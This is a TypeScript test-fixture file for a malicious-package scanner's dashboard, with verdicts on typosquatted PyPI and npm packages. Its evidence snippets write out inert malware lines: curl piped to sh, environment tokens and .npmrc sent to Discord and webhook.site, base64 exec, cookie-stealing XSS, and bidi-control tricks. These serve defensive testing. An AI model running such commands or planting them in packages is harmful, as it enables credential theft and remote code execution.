// Realistic fixtures for development and tests. Shapes follow docs/DESIGN.md sections 6
// to 8 exactly, as the Rust server would send them. Snippets imitate real malware but are
// inert strings; some deliberately contain HTML and bidi control characters to prove the
// UI renders them as text.

export interface RawVerdict {
  id: string;
  ecosystem: 'pypi' | 'npm';
  name: string;
  version: string;
  artifact: string;
  sha256: string;
  decision: 'allow' | 'warn' | 'block';
  risk: number;
  scores: { code_gbdt: number; code_nn: number | null; name: number };
  policy_hits: { rule: string; severity: 'allow' | 'warn' | 'block'; detail: string }[];
  reasons: { feature: string; value: number; contribution: number; label: string | null }[];
  evidence: { indicator: string; file: string; line: number | null; snippet: string }[];
  scanned_ms: number;
  model_version: string;
  cached: boolean;
}

export interface RawEvent {
  id: number;
  ts: string;
  ecosystem: 'pypi' | 'npm';
  name: string;
  version: string | null;
  client: string;
  kind: 'install' | 'check' | 'nonexistent_package';
  decision: 'allow' | 'warn' | 'block' | null;
  risk: number | null;
  verdict_id: string | null;
}

export const MODEL_VERSION = '2026.10.0';

/** Deterministic pseudo-random generator so fixtures are stable across reloads. */
export function mulberry32(seed: number): () => number {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

/** Picks an element by a random number in [0, 1). The list must not be empty. */
export function pick<T>(list: readonly T[], r: number): T {
  const v = list[Math.min(list.length - 1, Math.floor(r * list.length))];
  if (v === undefined) throw new Error('pick from empty list');
  return v;
}

function fnv1a(s: string, seed = 0x811c9dc5): number {
  let h = seed >>> 0;
  for (let i = 0; i < s.length; i++) {
    h ^= s.charCodeAt(i);
    h = Math.imul(h, 0x01000193) >>> 0;
  }
  return h >>> 0;
}

/** Fake but stable 64-hex sha256 for a string. */
export function fakeSha(s: string): string {
  let out = '';
  let h = fnv1a(s);
  while (out.length < 64) {
    h = fnv1a(out + s, h);
    out += h.toString(16).padStart(8, '0');
  }
  return out.slice(0, 64);
}

const base = (v: Omit<RawVerdict, 'sha256' | 'model_version'>): RawVerdict => ({
  ...v,
  sha256: fakeSha(`${v.ecosystem}:${v.name}@${v.version}`),
  model_version: MODEL_VERSION,
});

export const BLOCKED_TYPOSQUAT = base({
  id: 'v_7f3a91c2',
  ecosystem: 'pypi',
  name: 'reqeusts',
  version: '2.32.4',
  artifact: 'reqeusts-2.32.4.tar.gz',
  decision: 'block',
  risk: 0.993,
  scores: { code_gbdt: 0.996, code_nn: 0.957, name: 0.942 },
  policy_hits: [{ rule: 'min_age_days', severity: 'block', detail: 'published 5 hours ago (policy: 3 days)' }],
  reasons: [
    { feature: 'inst_proc_exec', value: 2, contribution: 1.84, label: 'Runs shell commands at install time' },
    { feature: 'inst_exfil_endpoint', value: 1, contribution: 1.61, label: null },
    { feature: 'inst_env_access', value: 3, contribution: 0.92, label: 'Reads environment variables at install time' },
    { feature: 'inst_network', value: 2, contribution: 0.77, label: 'Makes network requests at install time' },
    { feature: 'name_min_edit_distance', value: 1, contribution: 0.69, label: 'One edit away from the popular package "requests"' },
    { feature: 'inst_decode_obf', value: 1, contribution: 0.44, label: 'Decodes base64 at import time' },
    { feature: 'meta_has_repo', value: 0, contribution: 0.18, label: 'No source repository linked' },
    { feature: 'meta_readme_bytes', value: 4210, contribution: -0.21, label: 'Has a README (copied from requests)' },
    { feature: 'meta_has_license', value: 1, contribution: -0.09, label: 'Declares a license' },
  ],
  evidence: [
    {
      indicator: 'proc_exec',
      file: 'setup.py',
      line: 18,
      snippet: 'os.system("curl -fsSL http://45.61.139.22/u.sh | sh >/dev/null 2>&1")',
    },
    {
      indicator: 'recon',
      file: 'setup.py',
      line: 22,
      snippet: 'host = socket.gethostname() + "/" + getpass.getuser()',
    },
    {
      indicator: 'env_access',
      file: 'setup.py',
      line: 25,
      snippet: 'env = {k: v for k, v in os.environ.items() if "KEY" in k or "TOKEN" in k}',
    },
    {
      indicator: 'exfil_endpoint',
      file: 'setup.py',
      line: 27,
      snippet:
        'requests.post("https://discord.com/api/webhooks/1187342216093/Xb9qT-redacted",\n    json={"content": host + " " + str(env)})',
    },
    {
      indicator: 'decode_obf',
      file: 'reqeusts/__init__.py',
      line: 4,
      snippet: 'exec(__import__("base64").b64decode("aW1wb3J0IG9zLHNvY2tldA=="))',
    },
  ],
  scanned_ms: 14,
  cached: false,
});

export const BLOCKED_SCOPE_SQUAT = base({
  id: 'v_c41d0e88',
  ecosystem: 'npm',
  name: '@lodash-utils/core',
  version: '4.17.22',
  artifact: 'core-4.17.22.tgz',
  decision: 'block',
  risk: 0.964,
  scores: { code_gbdt: 0.951, code_nn: 0.982, name: 0.811 },
  policy_hits: [
    {
      rule: 'block_install_scripts_from_new',
      severity: 'block',
      detail: 'postinstall script in a package published 1 day ago (policy: 3 days)',
    },
  ],
  reasons: [
    { feature: 'inst_secret_paths', value: 2, contribution: 1.42, label: 'Reads npm and SSH credentials at install time' },
    { feature: 'inst_exfil_endpoint', value: 1, contribution: 1.2, label: 'Sends data to webhook.site' },
    { feature: 'inst_obf_ident_ratio', value: 0.41, contribution: 0.86, label: null },
    { feature: 'n_npm_install_scripts', value: 1, contribution: 0.55, label: 'Has a postinstall script' },
    { feature: 'name_scope_squat', value: 1, contribution: 0.51, label: 'Scope imitates the lodash project' },
    { feature: 'inst_longest_b64_run', value: 1840, contribution: 0.38, label: null },
    { feature: 'meta_n_deps', value: 0, contribution: -0.12, label: 'No dependencies' },
  ],
  evidence: [
    {
      indicator: 'proc_exec',
      file: 'package.json:scripts.postinstall',
      line: null,
      snippet: 'node install.js',
    },
    {
      indicator: 'decode_obf',
      file: 'install.js',
      line: 3,
      snippet: 'const _0x4a1b = Buffer.from("PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==", "base64").toString();',
    },
    {
      indicator: 'secret_paths',
      file: 'install.js',
      line: 7,
      snippet: 'const npmrc = fs.readFileSync(path.join(os.homedir(), ".npmrc"), "utf8");',
    },
    {
      indicator: 'exfil_endpoint',
      file: 'install.js',
      line: 12,
      snippet: 'https.request({ hostname: "webhook.site", path: "/3f1c9a2e-77d1", method: "POST" })',
    },
    {
      indicator: 'dyn_code',
      file: 'index.js',
      line: 1,
      snippet:
        '/*<img src=x onerror=alert(document.domain)>*/ eval(_0x4a1b + "<script>fetch(\'//evil.example/\'+document.cookie)</script>")',
    },
    {
      indicator: 'dyn_code',
      file: 'lib/\u202Esj.nimda/check.js',
      line: 22,
      snippet: 'if (isAdmin) { /*\u202E } \u2066if (isAdmin)\u2069 \u2066 begin admins only */ run(payload) }',
    },
  ],
  scanned_ms: 21,
  cached: false,
});

export const WARNED_NEW = base({
  id: 'v_2b8e5f17',
  ecosystem: 'npm',
  name: 'vite-plugin-env-loader',
  version: '0.0.3',
  artifact: 'vite-plugin-env-loader-0.0.3.tgz',
  decision: 'warn',
  risk: 0.46,
  scores: { code_gbdt: 0.41, code_nn: 0.52, name: 0.33 },
  policy_hits: [],
  reasons: [
    { feature: 'inst_env_access', value: 1, contribution: 0.63, label: 'Lists environment variable names at import time' },
    { feature: 'all_network', value: 1, contribution: 0.41, label: 'Sends a request to a telemetry endpoint' },
    { feature: 'meta_version_is_zero', value: 1, contribution: 0.38, label: null },
    { feature: 'meta_has_repo', value: 0, contribution: 0.29, label: 'No source repository linked' },
    { feature: 'meta_readme_bytes', value: 212, contribution: 0.22, label: 'Very short README' },
    { feature: 'meta_has_license', value: 1, contribution: -0.18, label: 'Declares a license' },
    { feature: 'inst_obf_ident_ratio', value: 0, contribution: -0.35, label: 'No obfuscated identifiers' },
  ],
  evidence: [
    {
      indicator: 'env_access',
      file: 'index.js',
      line: 14,
      snippet: 'const secrets = Object.keys(process.env).filter((k) => /TOKEN|KEY|SECRET/.test(k));',
    },
    {
      indicator: 'network',
      file: 'index.js',
      line: 31,
      snippet: 'fetch("https://telemetry.envloader.dev/v1/collect", { method: "POST", body: JSON.stringify({ n: secrets.length }) })',
    },
  ],
  scanned_ms: 8,
  cached: false,
});

export const WARNED_TOKEN = base({
  id: 'v_9a04c3d5',
  ecosystem: 'pypi',
  name: 'langchain-community-tools',
  version: '0.0.1',
  artifact: 'langchain_community_tools-0.0.1-py3-none-any.whl',
  decision: 'warn',
  risk: 0.38,
  scores: { code_gbdt: 0.29, code_nn: 0.34, name: 0.77 },
  policy_hits: [],
  reasons: [
    { feature: 'name_contains_popular_token', value: 1, contribution: 0.72, label: 'Name embeds the popular package "langchain"' },
    { feature: 'meta_version_is_zero', value: 1, contribution: 0.4, label: 'Placeholder version 0.0.1' },
    { feature: 'inst_exfil_endpoint', value: 1, contribution: 0.33, label: 'Looks up the public IP address on import' },
    { feature: 'meta_desc_len', value: 0, contribution: 0.12, label: 'Empty description' },
    { feature: 'inst_proc_exec', value: 0, contribution: -0.48, label: 'No shell commands at install time' },
  ],
  evidence: [
    {
      indicator: 'exfil_endpoint',
      file: 'langchain_community_tools/__init__.py',
      line: 9,
      snippet: '_ip = urllib.request.urlopen("https://api.ipify.org").read().decode()',
    },
  ],
  scanned_ms: 6,
  cached: false,
});

interface AllowSpec {
  ecosystem: 'pypi' | 'npm';
  name: string;
  version: string;
  artifact: string;
  allowlisted?: boolean;
}

const ALLOW_SPECS: AllowSpec[] = [
  { ecosystem: 'pypi', name: 'requests', version: '2.32.3', artifact: 'requests-2.32.3-py3-none-any.whl', allowlisted: true },
  { ecosystem: 'pypi', name: 'numpy', version: '2.1.2', artifact: 'numpy-2.1.2-cp312-cp312-manylinux_2_17_x86_64.whl' },
  { ecosystem: 'pypi', name: 'fastapi', version: '0.115.0', artifact: 'fastapi-0.115.0-py3-none-any.whl' },
  { ecosystem: 'pypi', name: 'pydantic', version: '2.9.2', artifact: 'pydantic-2.9.2-py3-none-any.whl' },
  { ecosystem: 'pypi', name: 'httpx', version: '0.27.2', artifact: 'httpx-0.27.2-py3-none-any.whl' },
  { ecosystem: 'pypi', name: 'pandas', version: '2.2.3', artifact: 'pandas-2.2.3-cp312-cp312-manylinux_2_17_x86_64.whl' },
  { ecosystem: 'pypi', name: 'rich', version: '13.9.2', artifact: 'rich-13.9.2-py3-none-any.whl' },
  { ecosystem: 'npm', name: 'react', version: '18.3.1', artifact: 'react-18.3.1.tgz', allowlisted: true },
  { ecosystem: 'npm', name: 'express', version: '4.21.0', artifact: 'express-4.21.0.tgz' },
  { ecosystem: 'npm', name: '@types/node', version: '22.7.4', artifact: 'node-22.7.4.tgz' },
  { ecosystem: 'npm', name: '@tanstack/react-query', version: '5.59.0', artifact: 'react-query-5.59.0.tgz' },
  { ecosystem: 'npm', name: 'zod', version: '3.23.8', artifact: 'zod-3.23.8.tgz' },
  { ecosystem: 'npm', name: 'axios', version: '1.7.7', artifact: 'axios-1.7.7.tgz' },
  { ecosystem: 'npm', name: 'vite', version: '5.4.8', artifact: 'vite-5.4.8.tgz' },
];

function allowVerdict(spec: AllowSpec, i: number): RawVerdict {
  const r = mulberry32(fnv1a(spec.name));
  const risk = Math.round((0.001 + r() * 0.03) * 1000) / 1000;
  const network = spec.name === 'requests' || spec.name === 'httpx' || spec.name === 'axios';
  return base({
    id: `v_a${(1000 + i).toString(16)}${fnv1a(spec.name).toString(16).slice(0, 4)}`,
    ecosystem: spec.ecosystem,
    name: spec.name,
    version: spec.version,
    artifact: spec.artifact,
    decision: 'allow',
    risk,
    scores: {
      code_gbdt: Math.round(risk * 1.2 * 1000) / 1000,
      code_nn: spec.ecosystem === 'npm' && i % 3 === 0 ? null : Math.round(r() * 0.05 * 1000) / 1000,
      name: Math.round(r() * 0.02 * 1000) / 1000,
    },
    policy_hits: spec.allowlisted ? [{ rule: 'allow', severity: 'allow', detail: `on the allow list (${spec.ecosystem}:${spec.name})` }] : [],
    reasons: [
      { feature: 'meta_has_repo', value: 1, contribution: -0.62, label: 'Links a source repository' },
      { feature: 'meta_readme_bytes', value: 8000 + Math.floor(r() * 20000), contribution: -0.48, label: 'Detailed README' },
      { feature: 'meta_has_license', value: 1, contribution: -0.3, label: 'Declares a license' },
      ...(network
        ? [{ feature: 'all_network', value: 14, contribution: 0.21, label: 'Makes network requests (expected for an HTTP client)' }]
        : [{ feature: 'inst_proc_exec', value: 0, contribution: -0.27, label: 'No shell commands at install time' }]),
    ],
    evidence: network
      ? [
          {
            indicator: 'network',
            file: spec.ecosystem === 'pypi' ? `${spec.name}/api.py` : 'lib/adapters/http.js',
            line: 59,
            snippet: spec.ecosystem === 'pypi' ? 'return session.request(method=method, url=url, **kwargs)' : 'const req = transport.request(options, handleResponse);',
          },
        ]
      : [],
    scanned_ms: 5 + Math.floor(r() * 40),
    cached: i % 2 === 0,
  });
}

export const ALLOWED: RawVerdict[] = ALLOW_SPECS.map(allowVerdict);

export const ALL_VERDICTS: RawVerdict[] = [...ALLOWED, BLOCKED_TYPOSQUAT, BLOCKED_SCOPE_SQUAT, WARNED_NEW, WARNED_TOKEN];

/** Names that do not exist on the registry (typical LLM hallucinations). */
export const NONEXISTENT: { ecosystem: 'pypi' | 'npm'; name: string }[] = [
  { ecosystem: 'pypi', name: 'huggingface-cli' },
  { ecosystem: 'npm', name: 'react-codeshift' },
  { ecosystem: 'pypi', name: 'fastapi-auth-jwt-pro' },
  { ecosystem: 'pypi', name: 'pandas-ta-utils' },
  { ecosystem: 'npm', name: '@vercel/edge-config-utils' },
];

const CLIENTS = {
  pypi: ['pip/24.2', 'uv/0.4.18', 'pip/24.2', 'poetry/1.8.3'],
  npm: ['npm/10.8.3', 'pnpm/9.12.0', 'npm/10.8.3', 'yarn/4.5.0'],
};
export const AGENT_CLIENT = 'claude-code';

interface Scenario {
  verdict?: RawVerdict;
  nonexistent?: { ecosystem: 'pypi' | 'npm'; name: string };
  hoursAgo: number;
  client: string;
  kind: RawEvent['kind'];
}

const SCENARIOS: Scenario[] = [
  { verdict: BLOCKED_TYPOSQUAT, hoursAgo: 0.35, client: AGENT_CLIENT, kind: 'check' },
  { nonexistent: NONEXISTENT[0], hoursAgo: 1.1, client: AGENT_CLIENT, kind: 'nonexistent_package' },
  { verdict: BLOCKED_SCOPE_SQUAT, hoursAgo: 2.4, client: 'npm/10.8.3', kind: 'install' },
  { verdict: WARNED_NEW, hoursAgo: 5.2, client: 'npm/10.8.3', kind: 'install' },
  { nonexistent: NONEXISTENT[1], hoursAgo: 12.5, client: AGENT_CLIENT, kind: 'nonexistent_package' },
  { verdict: BLOCKED_TYPOSQUAT, hoursAgo: 26, client: 'pip/24.2', kind: 'install' },
  { verdict: WARNED_TOKEN, hoursAgo: 30, client: 'uv/0.4.18', kind: 'install' },
  { verdict: BLOCKED_SCOPE_SQUAT, hoursAgo: 50, client: 'pnpm/9.12.0', kind: 'install' },
  { nonexistent: NONEXISTENT[2], hoursAgo: 60, client: AGENT_CLIENT, kind: 'nonexistent_package' },
  { verdict: BLOCKED_TYPOSQUAT, hoursAgo: 75, client: 'uv/0.4.18', kind: 'install' },
  { verdict: WARNED_NEW, hoursAgo: 98, client: 'npm/10.8.3', kind: 'install' },
  { nonexistent: NONEXISTENT[3], hoursAgo: 120, client: 'uv/0.4.18', kind: 'nonexistent_package' },
  { verdict: BLOCKED_SCOPE_SQUAT, hoursAgo: 140, client: AGENT_CLIENT, kind: 'check' },
  { verdict: WARNED_TOKEN, hoursAgo: 170, client: AGENT_CLIENT, kind: 'check' },
  { nonexistent: NONEXISTENT[4], hoursAgo: 200, client: AGENT_CLIENT, kind: 'nonexistent_package' },
  { verdict: BLOCKED_SCOPE_SQUAT, hoursAgo: 220, client: 'npm/10.8.3', kind: 'install' },
  { verdict: BLOCKED_TYPOSQUAT, hoursAgo: 262, client: AGENT_CLIENT, kind: 'check' },
  { verdict: BLOCKED_TYPOSQUAT, hoursAgo: 266, client: 'pip/24.2', kind: 'install' },
];

export function eventFromVerdict(
  v: RawVerdict,
  id: number,
  ts: Date,
  client: string,
  kind: RawEvent['kind'],
): RawEvent {
  return {
    id,
    ts: ts.toISOString(),
    ecosystem: v.ecosystem,
    name: v.name,
    version: v.version,
    client,
    kind,
    decision: v.decision,
    risk: v.risk,
    verdict_id: v.id,
  };
}

export function nonexistentEvent(
  pkg: { ecosystem: 'pypi' | 'npm'; name: string },
  id: number,
  ts: Date,
  client: string,
): RawEvent {
  return {
    id,
    ts: ts.toISOString(),
    ecosystem: pkg.ecosystem,
    name: pkg.name,
    version: null,
    client,
    kind: 'nonexistent_package',
    decision: 'block',
    risk: null,
    verdict_id: null,
  };
}

/** Builds 14 days of history ending at `now`, oldest first, with ids ascending. */
export function buildHistory(now: number): RawEvent[] {
  const rnd = mulberry32(20261007);
  const items: { at: number; make: (id: number) => RawEvent }[] = [];
  const hour = 3600 * 1000;
  for (let day = 13; day >= 0; day--) {
    const n = 5 + Math.floor(rnd() * 9);
    for (let k = 0; k < n; k++) {
      const at = now - day * 24 * hour - rnd() * 22 * hour - 0.5 * hour;
      const v = pick(ALLOWED, rnd());
      const agent = rnd() < 0.25;
      const clients = CLIENTS[v.ecosystem];
      const client = agent ? AGENT_CLIENT : pick(clients, rnd());
      const kind: RawEvent['kind'] = agent ? 'check' : 'install';
      items.push({ at, make: (id) => eventFromVerdict(v, id, new Date(at), client, kind) });
    }
  }
  for (const s of SCENARIOS) {
    const at = now - s.hoursAgo * hour;
    if (s.verdict) {
      const v = s.verdict;
      items.push({ at, make: (id) => eventFromVerdict(v, id, new Date(at), s.client, s.kind) });
    } else if (s.nonexistent) {
      const pkg = s.nonexistent;
      items.push({ at, make: (id) => nonexistentEvent(pkg, id, new Date(at), s.client) });
    }
  }
  items.sort((a, b) => a.at - b.at);
  return items.map((it, i) => it.make(i + 1));
}

export const INITIAL_POLICY = {
  mode: 'enforce',
  warn_threshold: 'model',
  block_threshold: 'model',
  min_age_days: 3,
  block_nonexistent: true,
  block_install_scripts_from_new: true,
  provenance_dropped: 'warn',
  install_script_added: 'block',
  publisher_changed: 'warn',
  dormant_revival: 'warn',
  dormant_days: 365,
  version_anomaly: 'off',
  nonregistry_dependency_added: 'block',
  young_dependency_added: 'block',
  young_dependency_days: 7,
  unread_code: 'block',
  scan_error: 'block',
  allow: ['pypi:requests', 'npm:react'],
  deny: ['npm:event-stream@3.3.6'],
  upstream: {
    pypi_simple: 'https://pypi.org/simple',
    pypi_files: 'https://files.pythonhosted.org',
    pypi_json: 'https://pypi.org/pypi',
    npm: 'https://registry.npmjs.org',
  },
};

export const MODEL_INFO = {
  model_version: MODEL_VERSION,
  feature_schema_version: 1,
  thresholds: { warn: 0.35, block: 0.8, target_fpr_block: 0.001 },
  metrics: {
    split: 'temporal',
    roc_auc: { value: 0.9912, ci_low: 0.9881, ci_high: 0.9938 },
    pr_auc: { value: 0.9618, ci_low: 0.9534, ci_high: 0.9689 },
    recall_at_fpr_0_001: { value: 0.874, ci_low: 0.851, ci_high: 0.896 },
    recall_at_fpr_0_01: { value: 0.943, ci_low: 0.929, ci_high: 0.956 },
    brier: { value: 0.0114 },
    n_test_malicious: 4210,
    n_test_benign: 18342,
    baselines: {
      guarddog: { fpr: 0.031, recall: 0.744, customs_recall_at_matched_fpr: 0.962 },
    },
  },
};
